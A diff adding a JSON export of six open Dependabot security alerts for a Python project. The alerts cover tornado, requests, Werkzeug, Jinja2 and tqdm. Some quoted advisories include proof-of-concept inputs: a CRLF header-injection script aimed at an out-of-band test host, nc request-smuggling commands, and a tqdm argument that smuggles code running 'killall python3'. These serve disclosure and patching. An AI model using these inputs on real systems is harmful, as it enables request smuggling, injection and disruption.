@@ -1,0 +1,567 @@
+[
+    {
+        "number": 6,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tornado"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-w235-7p84-xx57",
+            "cve_id": null,
+            "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
+            "description": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-w235-7p84-xx57",
+                    "type": "GHSA"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
+                },
+                {
+                    "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-w235-7p84-xx57"
+                }
+            ],
+            "published_at": "2024-06-06T21:46:31Z",
+            "updated_at": "2024-06-07T06:50:03Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "tornado"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 6.4.0",
+                    "first_patched_version": {
+                        "identifier": "6.4.1"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "score": 6.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-93",
+                    "name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tornado"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 6.4.0",
+            "first_patched_version": {
+                "identifier": "6.4.1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/6",
+        "html_url": "https://github.com/fcas/river/security/dependabot/6",
+        "created_at": "2024-06-06T23:54:02Z",
+        "updated_at": "2024-06-06T23:54:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 5,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tornado"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-753j-mpmx-qq6g",
+            "cve_id": null,
+            "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
+            "description": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-753j-mpmx-qq6g",
+                    "type": "GHSA"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
+                },
+                {
+                    "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-753j-mpmx-qq6g"
+                }
+            ],
+            "published_at": "2024-06-06T21:41:20Z",
+            "updated_at": "2024-06-06T21:41:22Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "tornado"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 6.4.0",
+                    "first_patched_version": {
+                        "identifier": "6.4.1"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "score": 5.3
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-444",
+                    "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tornado"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 6.4.0",
+            "first_patched_version": {
+                "identifier": "6.4.1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/5",
+        "html_url": "https://github.com/fcas/river/security/dependabot/5",
+        "created_at": "2024-06-06T23:50:03Z",
+        "updated_at": "2024-06-06T23:50:03Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 4,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "requests"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-9wx4-h78v-vm56",
+            "cve_id": "CVE-2024-35195",
+            "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+            "description": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.\n\n### Remediation\nAny of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.\n\n* Upgrade to `requests>=2.32.0`.\n* For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.\n* For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.\n\n### Related Links\n* https://github.com/psf/requests/pull/6655",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-9wx4-h78v-vm56",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-35195",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56"
+                },
+                {
+                    "url": "https://github.com/psf/requests/pull/6655"
+                },
+                {
+                    "url": "https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYLSNK5TL46Q6XPRVMHVWS63MVJQOK4Q"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N7WP6EYDSUOCOJYHDK5NX43PYZ4SNHGZ"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-9wx4-h78v-vm56"
+                }
+            ],
+            "published_at": "2024-05-20T20:15:00Z",
+            "updated_at": "2024-06-10T18:31:04Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "requests"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 2.32.0",
+                    "first_patched_version": {
+                        "identifier": "2.32.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+                "score": 5.6
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-670",
+                    "name": "Always-Incorrect Control Flow Implementation"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "requests"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 2.32.0",
+            "first_patched_version": {
+                "identifier": "2.32.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/4",
+        "html_url": "https://github.com/fcas/river/security/dependabot/4",
+        "created_at": "2024-05-21T08:36:36Z",
+        "updated_at": "2024-05-21T08:36:36Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 3,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Werkzeug"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-2g68-c3qc-8985",
+            "cve_id": "CVE-2024-34069",
+            "summary": "Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain",
+            "description": "The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-2g68-c3qc-8985",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-34069",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985"
+                },
+                {
+                    "url": "https://github.com/pallets/werkzeug/commit/3386395b24c7371db11a5b8eaac0c91da5362692"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34069"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H4SH32AM3CTPMAAEOIDAN7VU565LO4IR"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HFERFN7PINV4MOGMGA3DPIXJPDCYOEJZ"
+                },
+                {
+                    "url": "https://security.netapp.com/advisory/ntap-20240614-0004"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-2g68-c3qc-8985"
+                }
+            ],
+            "published_at": "2024-05-06T14:21:27Z",
+            "updated_at": "2024-06-14T15:31:25Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "Werkzeug"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.0.3",
+                    "first_patched_version": {
+                        "identifier": "3.0.3"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 7.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-352",
+                    "name": "Cross-Site Request Forgery (CSRF)"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Werkzeug"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.0.3",
+            "first_patched_version": {
+                "identifier": "3.0.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/3",
+        "html_url": "https://github.com/fcas/river/security/dependabot/3",
+        "created_at": "2024-05-17T00:33:18Z",
+        "updated_at": "2024-05-17T00:33:18Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 2,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Jinja2"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-h75v-3vvj-5mfj",
+            "cve_id": "CVE-2024-34064",
+            "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+            "description": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-h75v-3vvj-5mfj",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-34064",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj"
+                },
+                {
+                    "url": "https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34064"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-h75v-3vvj-5mfj"
+                }
+            ],
+            "published_at": "2024-05-06T14:20:59Z",
+            "updated_at": "2024-06-10T18:30:58Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "Jinja2"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.1.4",
+                    "first_patched_version": {
+                        "identifier": "3.1.4"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+                "score": 5.4
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Jinja2"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.1.4",
+            "first_patched_version": {
+                "identifier": "3.1.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/2",
+        "html_url": "https://github.com/fcas/river/security/dependabot/2",
+        "created_at": "2024-05-17T00:33:18Z",
+        "updated_at": "2024-05-17T00:33:18Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 1,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tqdm"
+            },
+            "manifest_path": "poetry.lock",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-g7vv-2v7x-gj9p",
+            "cve_id": "CVE-2024-34062",
+            "summary": "tqdm CLI arguments injection attack",
+            "description": "### Impact\nAny optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:\n\n```sh\npython -m tqdm --manpath=\"\\\" + str(exec(\\\"import os\\nos.system('echo hi && killall python3')\\\")) + \\\"\"\n```\n\n### Patches\nhttps://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm>=4.66.3`\n\n### Workarounds\nNone\n\n### References\n- https://github.com/tqdm/tqdm/releases/tag/v4.66.3",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-g7vv-2v7x-gj9p",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-34062",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/tqdm/tqdm/security/advisories/GHSA-g7vv-2v7x-gj9p"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34062"
+                },
+                {
+                    "url": "https://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PA3GIGHPWAHCTT4UF57LTPZGWHAX3GW6"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QRECVQCCESHBS3UJOWNXQUIX725TKNY6"
+                },
+                {
+                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VA337CYUS4SLRFV2P6MX6MZ2LKFURKJC"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-g7vv-2v7x-gj9p"
+                }
+            ],
+            "published_at": "2024-05-03T19:33:28Z",
+            "updated_at": "2024-06-10T18:30:58Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "tqdm"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": ">= 4.4.0, < 4.66.3",
+                    "first_patched_version": {
+                        "identifier": "4.66.3"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
+                "score": 3.9
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-74",
+                    "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "tqdm"
+            },
+            "severity": "low",
+            "vulnerable_version_range": ">= 4.4.0, < 4.66.3",
+            "first_patched_version": {
+                "identifier": "4.66.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/river/dependabot/alerts/1",
+        "html_url": "https://github.com/fcas/river/security/dependabot/1",
+        "created_at": "2024-05-17T00:33:18Z",
+        "updated_at": "2024-05-17T00:33:18Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    }
+]
